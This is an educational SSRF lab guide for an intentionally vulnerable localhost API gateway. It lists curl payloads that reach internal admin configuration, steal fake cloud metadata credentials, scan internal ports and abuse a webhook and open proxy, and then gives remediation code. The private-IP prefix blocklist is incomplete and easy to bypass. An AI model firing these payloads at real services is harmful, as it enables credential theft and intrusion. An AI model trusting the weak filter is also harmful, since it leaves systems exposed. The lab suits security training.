Lab 03 — SSRF Lab Guide ← Lab UI
Educational Lab: Contains intentional SSRF vulnerabilities. Use only in isolated training environments.
Lab Overview

Application: APIHub — Node.js API Gateway with microservices

Target: http://localhost:3000

Architecture:

  • API Gateway (3000) — public facing, SSRF vulnerable
  • Auth Service (3001) — internal, has debug endpoint
  • User Service (3002) — internal user data
  • Admin Service (3003) — internal, contains sensitive config
  • Fake IMDS (8169) — simulates cloud metadata with fake credentials
Step 1: Reconnaissance
curl http://localhost:3000/api/services    # Discover internal service IPs/ports
curl http://localhost:3000/api/health/all  # Check which services are reachable
curl http://localhost:3000/api/fetch?url=http://localhost:3000/  # Self-SSRF

Step 3: Exploitation
SSRF-001: Access Internal Admin Service
curl "http://localhost:3000/api/fetch?url=http://127.0.0.1:3003/admin/config"
# Returns: DB credentials, API keys, JWT secrets, internal service IPs
SSRF-002: Cloud Metadata Credential Theft
curl "http://localhost:3000/api/fetch?url=http://127.0.0.1:8169/latest/meta-data/"
curl "http://localhost:3000/api/fetch?url=http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/"
curl "http://localhost:3000/api/fetch?url=http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/production-ec2-role"
# Returns: AccessKeyId, SecretAccessKey, Token (FAKE training credentials)
SSRF-003: Internal Port Scanning
curl "http://localhost:3000/api/scan/internal?range=127.0.0.1&ports=3000,3001,3002,3003,8169,22,80,443,8080,5432"
# Maps open/closed/filtered ports on the internal network
SSRF-004: Webhook SSRF
curl -X POST http://localhost:3000/api/webhook/notify \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:3003/admin/config"}'
SSRF-005: Open Proxy
curl "http://localhost:3000/api/proxy/127.0.0.1:3001/auth/debug"
curl "http://localhost:3000/api/proxy/127.0.0.1:3002/users"
Step 4: Impact Assessment
  • Database credentials exposed: Full database access → all data compromised
  • Cloud IAM credential theft: Attacker gains AWS access → data exfiltration, resource abuse
  • Internal service access: Bypass network segmentation entirely
  • JWT secret exposure: Attacker can forge auth tokens for any user
Step 5: Remediation
1. URL Allowlisting
const ALLOWED_DOMAINS = ['api.external.com', 'hooks.partner.com'];
function isUrlAllowed(url) {
    const parsed = new URL(url);
    return ALLOWED_DOMAINS.includes(parsed.hostname);
}
2. Block Private IP Ranges
const ipRangesPrivate = ['10.', '172.16.', '192.168.', '127.', '169.254.'];
function isPrivateIP(url) {
    const parsed = new URL(url);
    return ipRangesPrivate.some(prefix => parsed.hostname.startsWith(prefix));
}
3. Use IMDSv2 (AWS Metadata Protection)
# IMDSv2 requires a PUT request to get a token first
# Simple GET to 169.254.169.254 no longer works
4. Network Segmentation
